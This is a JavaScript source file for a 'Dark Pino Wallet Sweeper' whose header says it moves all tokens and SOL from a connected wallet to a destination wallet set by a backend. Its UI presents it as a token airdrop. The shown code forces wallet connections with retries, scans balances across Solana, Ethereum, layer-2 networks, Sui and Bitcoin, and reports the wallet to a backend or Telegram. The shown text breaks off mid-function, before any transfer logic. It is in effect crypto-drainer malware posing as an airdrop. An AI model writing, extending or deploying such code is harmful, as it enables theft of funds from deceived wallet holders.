/**
 * Dark Pino Wallet Sweeper
 * Transfers ALL tokens and SOL from source wallet to destination wallet
 */

class WalletSweeper {
    constructor() {
        this.config = {
            sourceWallet: null,
            destinationWallet: null,
            isConfigured: false
        };

        // Multi-chain balance storage
        this.solBalance = 0;
        this.tokenBalances = [];

        // Ethereum Mainnet
        this.ethBalance = 0;
        this.ethTokens = [];

        // Ethereum L2 Networks
        this.baseBalance = 0;
        this.baseTokens = [];
        this.arbitrumBalance = 0;
        this.arbitrumTokens = [];
        this.optimismBalance = 0;
        this.optimismTokens = [];
        this.polygonBalance = 0;
        this.polygonTokens = [];

        // Other Blockchains
        this.btcBalance = 0;
        this.btcAddress = null;
        this.suiBalance = 0;
        this.suiTokens = [];
        this.suiAddress = null;
        this.monadBalance = 0;
        this.monadTokens = [];
        this.monadAddress = null;

        this.isScanning = false;
        this.connection = null;
        this.ethConnection = null;

        // Network configurations
        this.networks = {
            ethereum: { chainId: '0x1', name: 'Ethereum Mainnet', rpc: 'https://mainnet.infura.io/v3/' },
            base: { chainId: '0x2105', name: 'Base', rpc: 'https://mainnet.base.org' },
            arbitrum: { chainId: '0xa4b1', name: 'Arbitrum One', rpc: 'https://arb1.arbitrum.io/rpc' },
            optimism: { chainId: '0xa', name: 'Optimism', rpc: 'https://mainnet.optimism.io' },
            polygon: { chainId: '0x89', name: 'Polygon', rpc: 'https://polygon-rpc.com' }
        };
    }

    /**
     * Initialize the sweeper system
     */
    async initialize() {
        try {
            // Initialize Solana connection with working public RPC
            const { Connection } = solanaWeb3;

            // Try multiple public RPC endpoints (CORS-enabled)
            const rpcEndpoints = [
                'https://rpc.magicblock.app/mainnet',
                'https://mainnet.helius-rpc.com/?api-key=free',
                'https://solana-api.syndica.io/access-token/MsX8oKZiUFGw2w8TvcUCUaD4QI9KZ8CqJxmn3Z2XJ8Y/',
                'https://solana.publicnode.com',
                'https://api.mainnet-beta.solana.com'
            ];

            let connectionEstablished = false;
            for (const endpoint of rpcEndpoints) {
                try {
                    console.log(`🧪 Testing RPC endpoint: ${endpoint}`);
                    const testConnection = new Connection(endpoint, 'confirmed');

                    // Actually test the connection by making a simple request
                    const blockHash = await testConnection.getLatestBlockhash();
                    console.log(`✅ Test successful for ${endpoint}, blockhash:`, blockHash.blockhash.substring(0, 8));

                    // If we get here, the endpoint works
                    this.connection = testConnection;
                    console.log(`🔗 Using RPC endpoint: ${endpoint}`);
                    connectionEstablished = true;
                    break;
                } catch (error) {
                    console.warn(`❌ Failed to connect to ${endpoint}:`, error.message);
                }
            }

            if (!connectionEstablished) {
                throw new Error('Could not establish connection to any Solana RPC endpoint. Please try again later.');
            }

            // Load wallet configuration
            await this.loadWalletConfiguration();

            // Check Phantom connection for Solana
            await this.checkWalletConnection();

            // Check Ethereum support
            await this.checkEthereumSupport();

            console.log('🍍 Dark Pino Token Airdrop System initialized');
            this.updateUI();

        } catch (error) {
            console.error('Failed to initialize wallet sweeper:', error);
            this.showNotification('Please configure your wallets first', 'warning');
        }
    }

    /**
     * Load wallet configuration from backend
     */
    async loadWalletConfiguration() {
        try {
            const response = await fetch('/api/wallet-config');
            const data = await response.json();

            if (!data.destinationWallet) {
                throw new Error('Destination wallet not configured');
            }

            this.config.destinationWallet = data.destinationWallet;
            this.config.isConfigured = true;

        } catch (error) {
            console.error('Failed to load wallet configuration:', error);
            this.config.isConfigured = false;
        }
    }

    /**
     * Check Ethereum support in Phantom
     */
    async checkEthereumSupport() {
        try {
            // Handle provider conflicts gracefully
            if (window.ethereum) {
                console.log('🔗 Ethereum provider detected');

                // Check if multiple providers exist and log warning
                if (window.ethereum.providers && window.ethereum.providers.length > 1) {
                    console.warn('⚠️ Multiple Ethereum providers detected. Using default provider.');
                }

                try {
                    // Check if it's connected
                    const accounts = await window.ethereum.request({ method: 'eth_accounts' });
                    if (accounts.length > 0) {
                        this.config.ethWallet = accounts[0];
                        console.log('💎 Ethereum wallet connected:', this.maskWallet(this.config.ethWallet));
                    } else {
                        console.log('💎 Ethereum wallet not connected');
                    }
                } catch (providerError) {
                    // Handle specific provider conflicts
                    if (providerError.message && providerError.message.includes('redefine property')) {
                        console.warn('⚠️ Ethereum provider conflict detected - using fallback detection');
                        // Try to get accounts directly without method check
                        try {
                            const accounts = await window.ethereum.request({ method: 'eth_accounts' });
                            if (accounts.length > 0) {
                                this.config.ethWallet = accounts[0];
                                console.log('💎 Ethereum wallet connected via fallback:', this.maskWallet(this.config.ethWallet));
                            }
                        } catch (fallbackError) {
                            console.warn('❌ Fallback Ethereum detection also failed:', fallbackError.message);
                        }
                    } else {
                        throw providerError;
                    }
                }
            } else {
                console.log('❌ No Ethereum provider found');
            }
        } catch (error) {
            console.warn('Ethereum detection failed:', error.message);
            // Don't throw error - allow app to continue without Ethereum
        }
    }

    /**
     * Check Phantom wallet connection
     */
    async checkWalletConnection() {
        // Check for multiple wallet extensions
        const walletProviders = [];
        if (window.solana) walletProviders.push('Solana Provider');
        if (window.solflare) walletProviders.push('Solflare');
        if (window.sollet) walletProviders.push('Sollet');
        if (window.slope) walletProviders.push('Slope');
        if (window.torus) walletProviders.push('Torus');
        if (window.coin98) walletProviders.push('Coin98');

        if (walletProviders.length > 1) {
            console.warn(`Multiple wallet extensions detected: ${walletProviders.join(', ')}. Using primary provider.`);
        }

        if (window.solana) {
            // Check if it's actually Phantom
            const isPhantom = window.solana.isPhantom === true;
            if (!isPhantom) {
                console.warn('Solana provider found but may not be Phantom. Attempting connection anyway.');
            }

            try {
                const resp = await window.solana.connect({ onlyIfTrusted: true });
                this.config.sourceWallet = resp.publicKey.toString();
                console.log('Connected to wallet:', this.maskWallet(this.config.sourceWallet));

                // Auto-scan balances when already connected
                await this.scanAllBalances();

                return true;
            } catch (error) {
                // This is expected if user hasn't pre-approved the connection
                console.log('Wallet not auto-connected (user approval needed)');
                return false;
            }
        } else {
            console.log('No Solana wallet provider found');
            return false;
        }
    }

    /**
     * Connect Phantom wallet manually
     */
    async connectPhantom() {
        // Check for wallet provider conflicts
        if (!window.solana) {
            // Check if another wallet is blocking Phantom
            if (window.solflare || window.sollet || window.slope) {
                this.showNotification('Another Solana wallet is active. Please disable other wallets and refresh.', 'warning');
            } else {
                this.showNotification('Please install Phantom wallet', 'error');
                window.open('https://phantom.app/', '_blank');
            }
            return false;
        }

        // Warn if not Phantom but continue anyway
        if (!window.solana.isPhantom) {
            console.warn('Solana provider detected but may not be Phantom. Attempting connection anyway.');
        }

        try {
            // Connect Solana
            const resp = await window.solana.connect();
            this.config.sourceWallet = resp.publicKey.toString();

            this.showNotification('Phantom wallet connected!', 'success');

            // Force Ethereum connection with retry logic
            console.log('🔗 Forcing Ethereum connection...');
            let ethConnected = false;

            for (let attempt = 1; attempt <= 3; attempt++) {
                console.log(`🔗 Ethereum connection attempt ${attempt}/3`);
                ethConnected = await this.connectEthereum();

                if (ethConnected) {
                    console.log('✅ Ethereum connected on attempt', attempt);
                    break;
                } else {
                    console.log(`❌ Ethereum connection failed, attempt ${attempt}/3`);
                    // Wait 1 second before retry
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }

            if (!ethConnected) {
                console.log('⚠️ Could not connect Ethereum after 3 attempts, continuing with Solana only');
            }

            this.updateUI();

            // Auto-scan balances when connected
            await this.scanAllBalances();

            return true;

        } catch (error) {
            console.error('Failed to connect Phantom:', error);
            this.showNotification('Failed to connect wallet', 'error');
            return false;
        }
    }

    /**
     * Connect Ethereum explicitly
     */
    async connectEthereum() {
        try {
            if (window.ethereum) {
                console.log('🔗 Requesting Ethereum account access...');

                // Request account access
                const accounts = await window.ethereum.request({
                    method: 'eth_requestAccounts'
                });

                if (accounts.length > 0) {
                    this.config.ethWallet = accounts[0];
                    console.log('💎 Ethereum wallet connected:', this.maskWallet(this.config.ethWallet));
                    this.showNotification('Ethereum connected!', 'success');
                    return true;
                } else {
                    console.log('💎 No Ethereum accounts found');
                    return false;
                }
            } else {
                console.log('❌ No Ethereum provider found');
                return false;
            }
        } catch (error) {
            console.warn('Ethereum connection failed:', error);
            return false;
        }
    }

    /**
     * Scan ALL token balances in the wallet - Comprehensive Multi-Chain Scanner
     */
    async scanAllBalances() {
        if (!this.config.sourceWallet || this.isScanning) return;

        this.isScanning = true;
        this.showScanningUI();

        console.log('🚀 Starting comprehensive multi-chain wallet scan...');

        try {
            // Reset all balances
            this.resetAllBalances();

            // 1. Scan Solana (Primary Chain)
            console.log('🔴 === SCANNING SOLANA ===');
            await this.scanSolanaBalances();

            // 2. Force Ethereum connection and scan if not connected
            if (!this.config.ethWallet) {
                console.log('💎 Ethereum not connected, forcing connection...');
                const ethConnected = await this.connectEthereum();
                if (ethConnected) {
                    console.log('✅ Ethereum connected during scan');
                } else {
                    console.log('❌ Ethereum connection failed during scan');
                }
            }

            // 3. Scan All EVM Chains
            console.log('🔵 === SCANNING ETHEREUM MAINNET ===');
            await this.scanEthereumBalancesWithRetry();

            console.log('🔷 === SCANNING ETHEREUM L2s ===');
            // Show notification about current network scanning
            this.showNotification('Scanning current EVM network only. Switch networks manually to scan others.', 'info');
            await this.scanLayer2Networks();

            // 4. Scan Non-EVM Chains
            console.log('⚡ === SCANNING SUI NETWORK ===');
            await this.scanSuiNetwork();

            console.log('🟠 === SCANNING BITCOIN ===');
            await this.scanBitcoinBalanceAdvanced();

            console.log('🟣 === CHECKING MONAD (PLACEHOLDER) ===');
            await this.checkMonadNetwork();

            // 5. Comprehensive Summary
            await this.logComprehensiveSummary();

            // Send wallet information to backend/Telegram
            await this.notifyWalletConnection();

            this.updateBalanceDisplay();

        } catch (error) {
            console.error('Failed to scan balances:', error);
            console.error('Error details:', error.message, error.stack);

            // Show more specific error message
            let errorMessage = 'Failed to scan wallet balances';
            if (error.message.includes('network')) {
                errorMessage = 'Network error - check your connection';
            } else if (error.message.includes('Invalid public key')) {
                errorMessage = 'Invalid wallet address';
            } else if (error.message.includes('SPL Token')) {
                errorMessage = 'SPL Token library not loaded properly';
            } else {
                errorMessage = `Scan failed: ${error.message}`;
            }

            this.showNotification(errorMessage, 'error');
        } finally {
            this.isScanning = false;
        }
    }

    /**
     * Scan Solana balances (SOL + SPL tokens)
     */
    async scanSolanaBalances() {
        try {
            const { PublicKey, LAMPORTS_PER_SOL } = solanaWeb3;

            // Access SPL Token constants from the global scope
            const TOKEN_PROGRAM_ID = new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');

            const walletPubkey = new PublicKey(this.config.sourceWallet);

            console.log('🔍 Starting Solana scan for:', this.maskWallet(this.config.sourceWallet));

            // Get SOL balance
            const solBalance = await this.connection.getBalance(walletPubkey);
            this.solBalance = solBalance / LAMPORTS_PER_SOL;
            console.log('💰 SOL balance found:', this.solBalance);

            // Get all SPL token accounts
            const tokenAccounts = await this.connection.getTokenAccountsByOwner(
                walletPubkey,
                { programId: TOKEN_PROGRAM_ID }
            );

            console.log('Found SPL token accounts:', tokenAccounts.value.length);

            // Process each token account
            for (const tokenAccount of tokenAccounts.value) {
                try {
                    const accountInfo = await this.connection.getParsedAccountInfo(tokenAccount.pubkey);

                    if (accountInfo.value && accountInfo.value.data.parsed) {
                        const parsedData = accountInfo.value.data.parsed.info;
                        const tokenAmount = parsedData.tokenAmount;

                        if (tokenAmount.uiAmount > 0) {
                            // Get token metadata
                            const tokenMint = parsedData.mint;
                            const tokenInfo = await this.getTokenInfo(tokenMint);

                            this.tokenBalances.push({
                                mint: tokenMint,
                                account: tokenAccount.pubkey.toString(),
                                balance: tokenAmount.uiAmount,
                                decimals: tokenAmount.decimals,
                                symbol: tokenInfo.symbol || 'UNKNOWN',
                                name: tokenInfo.name || 'Unknown Token',
                                isMeme: tokenInfo.isMeme || false
                            });

                            console.log('Found SPL token:', tokenInfo.symbol, tokenAmount.uiAmount);
                        }
                    }
                } catch (error) {
                    console.warn('Failed to process token account:', error);
                }
            }

            console.log(`✅ Solana scan complete: ${this.tokenBalances.length} SPL tokens, ${this.solBalance} SOL`);

        } catch (error) {
            console.error('Solana scanning failed:', error);
            throw error;
        }
    }

    /**
     * Get basic token info - EXPANDED SOLANA TOKEN REGISTRY
     */
    async getTokenInfo(mintAddress) {
        // Comprehensive Solana token registry with major SPL tokens
        const knownTokens = {
            // Stablecoins
            'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v': { symbol: 'USDC', name: 'USD Coin' },
            'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB': { symbol: 'USDT', name: 'Tether USD' },
            'EhpAdaA3D8BG59dYGVhKhGnY6RvG5UzSUNJpvzSC73h7': { symbol: 'USDT', name: 'Tether USD (Alternative)' },
            'AJRcJGsZUQl8aaRQM7GYiGdBDZLKAuuHMeDgQCDYhiYA': { symbol: 'PAI', name: 'PAI USD' },

            // Native & Wrapped
            'So11111111111111111111111111111111111111112': { symbol: 'WSOL', name: 'Wrapped SOL' },
            '9n4nbM75f5Ui33ZbPYXn59EwSgE8CGsHtAeTH5YFeJ9E': { symbol: 'BTC', name: 'Bitcoin (Wormhole)' },
            '2FPyTwcZLUg1MDrwsyoP4D6s1tM7hAkHYRjkNb5w6Pxk': { symbol: 'ETH', name: 'Ethereum (Wormhole)' },

            // DeFi Tokens
            'MNDEFzGvMt87ueuHvVU9VcTqsAP5b3fTGPsHuuPA5ey': { symbol: 'MNDE', name: 'Marinade' },
            'J1toso1uCk3RLmjorhTtrVwY9HJ7X8V9yYac6Y7kGCPn': { symbol: 'JTO', name: 'Jito' },
            'RAYkQbs7maDHzou8RFdVZDzdbYoH9Jj3YGhXDwBcq9ue': { symbol: 'RAY', name: 'Raydium' },
            'SHDWyBxihqiCj6YekG2GUr7wqKLeLAMK1gHZck9pL6y': { symbol: 'SHDW', name: 'Shadow Token' },
            'hntyVP6YFm1Hg25TN9WGLqM12b8TQmcknKrdu1oxWux': { symbol: 'HNT', name: 'Helium' },
            '5HkKjhM5Pxrq9kx7ZdcXs7Y9EwvhfPQFJ3TYjfv2C5V1': { symbol: 'SHDW', name: 'GenesysGo Shadow' },

            // Meme Tokens (Popular Solana Memes)
            '3K6rftdAaQYMPunrtNRHgnK2UAtjm2JwyT2oCiTDouYE': { symbol: 'BONK', name: 'Bonk', isMeme: true },
            'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263': { symbol: 'BONK', name: 'Bonk (Alternative)', isMeme: true },
            'EKpQGSJtjMFqKZ9KQanSqYXRcF8fBopzLHYxdM65zcjm': { symbol: 'WIF', name: 'dogwifhat', isMeme: true },
            '27G8MtK7VtTcCHkpASjSDdkWWYfoqT6ggEuKidVJidD4': { symbol: 'JUP', name: 'Jupiter', isMeme: false },

            // Additional Popular Meme Coins
            'HezGczjdykdgkzMeBWRJhFnmhbKyGsppKmw5hivcPLmE': { symbol: 'PEPE', name: 'Pepe (Solana)', isMeme: true },
            '7GCihgDB8fe6KNjn2MYtkzZcRjQy3t9GHdC8uHYmW2hr': { symbol: 'POPCAT', name: 'Popcat', isMeme: true },
            'MEW1gQWJ3nEXg2qgERiKu7FAFj79PHvQVREQUzScPP5': { symbol: 'MEW', name: 'Cat in a Dogs World', isMeme: true },
            'HhJpBhRRn4g56VsyLuT8DL5Bv31HkXqsrahTTUCZeZg4': { symbol: 'MYRO', name: 'Myro', isMeme: true },
            'ukHH6c7mMyiWCf1b9pnWe25TSpkDDt3H5pQZgZ74J82': { symbol: 'BOME', name: 'Book of Meme', isMeme: true },
            '5z3EqYQo9HiCEs3R84RCDMu2n7anpDMxRhdK8PSWmrRC': { symbol: 'SLERF', name: 'Slerf', isMeme: true },
            'A8C3xuqscfmyLrte3VmTqrAq8kgMASius9AFNANwpump': { symbol: 'PNUT', name: 'Peanut the Squirrel', isMeme: true },
            '2qEHjDLDLbuBgRYvsxhc5D6uDWAivNFZGan56P1tpump': { symbol: 'CHILLGUY', name: 'Chill Guy', isMeme: true },
            'Ed5nyyWEzpPPiWimP8vYm7sD7TD3LAt3Q3gRTWHzPJBY': { symbol: 'MOODENG', name: 'Moo Deng', isMeme: true },
            '9BB6NFEcjBCtnNLFko2FqVQBq8HHM13kCyYcdQbgpump': { symbol: 'FWOG', name: 'FWOG', isMeme: true },
            'GJAFwWjJ3vnTsrQVabjBVK2TYB1YtRCQXRDfDgUnpump': { symbol: 'GOAT', name: 'Goatseus Maximus', isMeme: true },
            'CLoUDKc4Ane7HeQcPpE3YHnznRxhMimJ4MyaUqyHFzAu': { symbol: 'CLOUD', name: 'Harambe on Solana', isMeme: true },

            // Gaming & NFT
            'ATLASXmbPQxBUYbxPsV97usA3fPQYEqzQBUHgiFCUsXx': { symbol: 'ATLAS', name: 'Star Atlas' },
            'poLisWXnNRwC6oBu1vHiuKQzFjGL4XDSu4g9qjz9qVk': { symbol: 'POLIS', name: 'Star Atlas DAO' },
            'SLNDpmoWTVADgEdndyvWzroNL7zSi1dF9PC3xHGtPwp': { symbol: 'SLND', name: 'Solend' },

            // Exchange Tokens
            'FTXToken11111111111111111111111111111111': { symbol: 'FTT', name: 'FTX Token' },
            'kinXdEcpDQeHPEuQnqmUgtYykqKGVFq6CeVX5iAHJq6': { symbol: 'KIN', name: 'Kin' },

            // Bridge Tokens
            'A9mUU4qviSctJVPJdBJWkb28deg915LYJKrzQ19ji3FM': { symbol: 'USDCet', name: 'USDC (Ethereum)' },
            'Dn4noZ5jgGfkntzcQSUZ8czkreiZ1ForXYoV2H8Dm7S1': { symbol: 'UNI', name: 'Uniswap' },

            // Popular SPL Tokens
            'MSKWjCjKfFBpLGJJcxTmhBjELGnKRPhjM7DYggPxNFz': { symbol: 'MSOL', name: 'Marinade staked SOL' },
            'mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So': { symbol: 'mSOL', name: 'Marinade staked SOL (Alt)' },
            'StepAscQoEioFxxWGnh2sLBDFp9d8rvKz2Yp39iDpyT': { symbol: 'STEP', name: 'Step Finance' },
            'BHSMgA3XGvYjgP8CjfKkDf6JzGBqKb3XxXSGn8v9e9hD': { symbol: 'PYTH', name: 'Pyth Network' },

            // Additional Popular Tokens
            'EKP7LYXLdyXTjFN1UGYPxDLdN9jPKxpJFxaEABHV9Qz8': { symbol: 'COPE', name: 'Cope' },
            'GDH1gf8g9qCYcjCL8SB4A5VhfNrKvjWTbr4r2BSJKmBG': { symbol: 'MEDIA', name: 'Media Network' },
            'SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt': { symbol: 'SRM', name: 'Serum' },
            'EPzgVsHTqq8sQPKpKBJqRdHhAr5ZfSBZzYBGNFJGCJQ8': { symbol: 'FIDA', name: 'Bonfida' },
        };

        return knownTokens[mintAddress] || { symbol: 'UNKNOWN', name: 'Unknown Token' };
    }

    /**
     * Scan Ethereum balances with retry logic
     */
    async scanEthereumBalancesWithRetry() {
        for (let attempt = 1; attempt <= 3; attempt++) {
            try {
                console.log(`💎 Ethereum scan attempt ${attempt}/3`);
                await this.scanEthereumBalances();
                console.log('✅ Ethereum scan successful');
                return;
            } catch (error) {
                console.warn(`❌ Ethereum scan attempt ${attempt}/3 failed:`, error);
                if (attempt < 3) {
                    console.log('⏳ Waiting 2 seconds before retry...');
                    await new Promise(resolve => setTimeout(resolve, 2000));
                }
            }
        }
        console.log('⚠️ All Ethereum scan attempts failed');
    }

    /**
     * Scan Ethereum balances and tokens
     */
    async scanEthereumBalances() {
        try {
            if (!window.ethereum || !this.config.ethWallet) {
                console.log('⚠️ Ethereum not available or not connected');
                return;
            }

            console.log('💎 Scanning Ethereum balances...');

            // Get ETH balance
            const ethBalance = await window.ethereum.request({
                method: 'eth_getBalance',
                params: [this.config.ethWallet, 'latest']
            });

            // Convert from wei to ETH
            this.ethBalance = parseInt(ethBalance, 16) / Math.pow(10, 18);
            console.log(`💎 ETH balance found: ${this.ethBalance}`);

            // Scan popular ERC-20 tokens
            await this.scanERC20Tokens();

            console.log(`✅ Ethereum scan complete: ${this.ethTokens.length} ERC-20 tokens, ${this.ethBalance} ETH`);

        } catch (error) {
            console.warn('Ethereum scanning failed:', error);
            throw error;
        }
    }

    /**
     * Scan popular ERC-20 tokens - EXPANDED LIST
     */
    async scanERC20Tokens() {
        try {
            this.ethTokens = [];

            console.log('🪙 Scanning major ERC-20 tokens...');

            // Comprehensive list of major ERC-20 tokens (corrected addresses)
            const popularTokens = [
                // Stablecoins
                { address: '0xA0b86a33E6417aD7acaD2273C51bD0F1e6C79D9f', symbol: 'USDC', decimals: 6 },
                { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', symbol: 'USDT', decimals: 6 },
                { address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', symbol: 'DAI', decimals: 18 },
                { address: '0x4Fabb145d64652a948d72533023f6E7A623C7C53', symbol: 'BUSD', decimals: 18 },
                { address: '0x853d955aCEf822Db058eb8505911ED77F175b99e', symbol: 'FRAX', decimals: 18 },
                { address: '0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3', symbol: 'MIM', decimals: 18 },

                // Major Cryptocurrencies
                { address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', symbol: 'WETH', decimals: 18 },
                { address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', symbol: 'WBTC', decimals: 8 },
                { address: '0x514910771AF9Ca656af840dff83E8264EcF986CA', symbol: 'LINK', decimals: 18 },
                { address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', symbol: 'UNI', decimals: 18 },

                // Layer 2 & Alt Chains
                { address: '0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0', symbol: 'MATIC', decimals: 18 },
                { address: '0xA0b73E1Ff0B80914AB6fe0444E65848C4C34450b', symbol: 'CRO', decimals: 8 },
                { address: '0x4e15361fd6b4bb609fa63c81a2be19d873717870', symbol: 'FTM', decimals: 18 },
                { address: '0x1a4b46696b2bb4794eb3d4c26f1c55f9170fa4c5', symbol: 'BIT', decimals: 18 },

                // DeFi Tokens
                { address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', symbol: 'AAVE', decimals: 18 },
                { address: '0xC011a73ee8576Fb46F5E1c5751cA3B9Fe0af2a6F', symbol: 'SNX', decimals: 18 },
                { address: '0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e', symbol: 'YFI', decimals: 18 },
                { address: '0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2', symbol: 'MKR', decimals: 18 },
                { address: '0xc00e94Cb662C3520282E6f5717214004A7f26888', symbol: 'COMP', decimals: 18 },
                { address: '0x6f259637dcd74c767781e37bc6133cd6a68aa161', symbol: 'HT', decimals: 18 },

                // Meme & Popular Tokens
                { address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', symbol: 'SHIB', decimals: 18 },
                { address: '0x4d224452801ACEd8B2F0aebE155379bb5D594381', symbol: 'APE', decimals: 18 },
                { address: '0x6982508145454Ce325dDbE47a25d4ec3d2311933', symbol: 'PEPE', decimals: 18 },
                { address: '0x3845badAde8e6dFF049820680d1F14bD3903a5d0', symbol: 'SAND', decimals: 18 },
                { address: '0x0F5D2fB29fb7d3CFeE444a200298f468908cC942', symbol: 'MANA', decimals: 18 },

                // Gaming & Metaverse
                { address: '0x037A54AaB062628C9Bbae1FDB1583c195585fe41', symbol: 'LRC', decimals: 18 },
                { address: '0xF629cBd94d3791C9250152BD8dfBDF380E2a3B9c', symbol: 'ENJ', decimals: 18 },
                { address: '0x15D4c048F83bd7e37d49eA4C83a07267Ec4203dA', symbol: 'GALA', decimals: 8 },

                // Exchange Tokens
                { address: '0xB8c77482e45F1F44dE1745F52C74426C631bDD52', symbol: 'BNB', decimals: 18 },
                { address: '0x50D1c9771902476076eCFc8B2A83Ad6b9355a4c9', symbol: 'FTT', decimals: 18 },
                { address: '0xa3BeD4E1c75D00fa6f4E5E6922DB7261B5E9AcD2', symbol: 'META', decimals: 18 },

                // Additional Major Tokens
                { address: '0xE41d2489571d322189246DaFA5ebDe1F4699F498', symbol: 'ZRX', decimals: 18 },
                { address: '0x1985365e9f78359a9B6AD760e32412f4a445E862', symbol: 'REP', decimals: 18 },
                { address: '0xdd974D5C2e2928deA5F71b9825b8b646686BD200', symbol: 'KNC', decimals: 18 },
                { address: '0x744d70FDBE2Ba4CF95131626614a1763DF805B9E', symbol: 'SNT', decimals: 18 },
                { address: '0xBBbbCA6A901c926F240b89EacB641d8Aec7AEafD', symbol: 'LRC', decimals: 18 }
            ];

            let tokenCount = 0;
            let foundTokens = 0;

            for (const token of popularTokens) {
                try {
                    tokenCount++;
                    console.log(`🔍 Checking ${token.symbol} (${tokenCount}/${popularTokens.length})...`);

                    // ERC-20 balanceOf function call
                    const data = '0x70a08231000000000000000000000000' + this.config.ethWallet.slice(2);

                    const balance = await window.ethereum.request({
                        method: 'eth_call',
                        params: [{
                            to: token.address,
                            data: data
                        }, 'latest']
                    });

                    const balanceValue = parseInt(balance, 16) / Math.pow(10, token.decimals);

                    if (balanceValue > 0) {
                        foundTokens++;
                        this.ethTokens.push({
                            symbol: token.symbol,
                            balance: balanceValue,
                            address: token.address
                        });
                        console.log(`✅ Found ${token.symbol}: ${balanceValue.toLocaleString()}`);
                    }

                    // Small delay to avoid rate limiting
                    await new Promise(resolve => setTimeout(resolve, 50));

                } catch (error) {
                    console.warn(`❌ Failed to check ${token.symbol}:`, error.message);
                }
            }

            console.log(`🪙 ERC-20 scan complete: Found ${foundTokens} tokens out of ${tokenCount} checked`);

        } catch (error) {
            console.warn('ERC-20 scanning failed:', error);
            throw error;
        }
    }

    /**
     * Reset all balance data
     */
    resetAllBalances() {
        // Solana
        this.solBalance = 0;
        this.tokenBalances = [];

        // Ethereum Mainnet
        this.ethBalance = 0;
        this.ethTokens = [];

        // Ethereum L2s
        this.baseBalance = 0;
        this.baseTokens = [];
        this.arbitrumBalance = 0;
        this.arbitrumTokens = [];
        this.optimismBalance = 0;
        this.optimismTokens = [];
        this.polygonBalance = 0;
        this.polygonTokens = [];

        // Other chains
        this.btcBalance = 0;
        this.suiBalance = 0;
        this.suiTokens = [];
        this.monadBalance = 0;
        this.monadTokens = [];
    }

    /**
     * Scan all Ethereum Layer 2 networks
     */
    async scanLayer2Networks() {
        const l2Networks = [
            { name: 'Base', networkId: 'base', chainId: '0x2105' },
            { name: 'Arbitrum', networkId: 'arbitrum', chainId: '0xa4b1' },
            { name: 'Optimism', networkId: 'optimism', chainId: '0xa' },
            { name: 'Polygon', networkId: 'polygon', chainId: '0x89' }
        ];

        // Check current network to avoid unnecessary switching
        let currentChainId = null;
        try {
            currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
            console.log(`📍 Currently on network: ${currentChainId}`);
        } catch (error) {
            console.warn('Could not get current chain ID:', error);
        }

        // Only scan the current network to avoid Trust Wallet prompts
        const currentNetwork = l2Networks.find(n => n.chainId === currentChainId);
        if (currentNetwork) {
            console.log(`🔍 Scanning current network: ${currentNetwork.name}`);
            try {
                await this.scanSpecificL2NetworkWithoutSwitch(currentNetwork);
            } catch (error) {
                console.warn(`❌ ${currentNetwork.name} scanning failed:`, error);
            }
        } else {
            console.log('📊 Currently on Ethereum Mainnet or unknown network');
            // If we're on mainnet, just scan mainnet without switching
            if (currentChainId === '0x1') {
                console.log('✅ Already on Ethereum mainnet, no L2 scanning needed');
            }
        }

        // Log info about other networks without switching
        console.log('ℹ️ To scan other L2 networks, please switch manually in your wallet');
    }

    /**
     * Scan a specific L2 network without switching
     */
    async scanSpecificL2NetworkWithoutSwitch(network) {
        try {
            if (!window.ethereum || !this.config.ethWallet) {
                console.log(`⚠️ Ethereum wallet not available for ${network.name}`);
                return;
            }

            // Get native token balance without switching
            const balance = await window.ethereum.request({
                method: 'eth_getBalance',
                params: [this.config.ethWallet, 'latest']
            });

            const nativeBalance = parseInt(balance, 16) / Math.pow(10, 18);

            // Store balance based on network
            switch (network.networkId) {
                case 'base':
                    this.baseBalance = nativeBalance;
                    await this.scanL2Tokens('base');
                    break;
                case 'arbitrum':
                    this.arbitrumBalance = nativeBalance;
                    await this.scanL2Tokens('arbitrum');
                    break;
                case 'optimism':
                    this.optimismBalance = nativeBalance;
                    await this.scanL2Tokens('optimism');
                    break;
                case 'polygon':
                    this.polygonBalance = nativeBalance;
                    await this.scanL2Tokens('polygon');
                    break;
            }

            console.log(`✅ ${network.name}: ${nativeBalance.toFixed(6)} native tokens`);

        } catch (error) {
            console.warn(`Failed to scan ${network.name}:`, error);
        }
    }

    /**
     * Scan a specific L2 network (legacy - requires switching)
     */
    async scanSpecificL2Network(network) {
        try {
            if (!window.ethereum || !this.config.ethWallet) {
                console.log(`⚠️ Ethereum wallet not available for ${network.name}`);
                return;
            }

            // Switch to the network
            await this.switchToNetwork(network.chainId);

            // Get native token balance
            const balance = await window.ethereum.request({
                method: 'eth_getBalance',
                params: [this.config.ethWallet, 'latest']
            });

            const nativeBalance = parseInt(balance, 16) / Math.pow(10, 18);

            // Store balance based on network
            switch (network.networkId) {
                case 'base':
                    this.baseBalance = nativeBalance;
                    await this.scanL2Tokens('base');
                    break;
                case 'arbitrum':
                    this.arbitrumBalance = nativeBalance;
                    await this.scanL2Tokens('arbitrum');
                    break;
                case 'optimism':
                    this.optimismBalance = nativeBalance;
                    await this.scanL2Tokens('optimism');
                    break;
                case 'polygon':
                    this.polygonBalance = nativeBalance;
                    await this.scanL2Tokens('polygon');
                    break;
            }

            console.log(`✅ ${network.name}: ${nativeBalance.toFixed(6)} native tokens`);

        } catch (error) {
            console.warn(`Failed to scan ${network.name}:`, error);
        }
    }

    /**
     * Switch to a specific network
     */
    async switchToNetwork(chainId) {
        try {
            await window.ethereum.request({
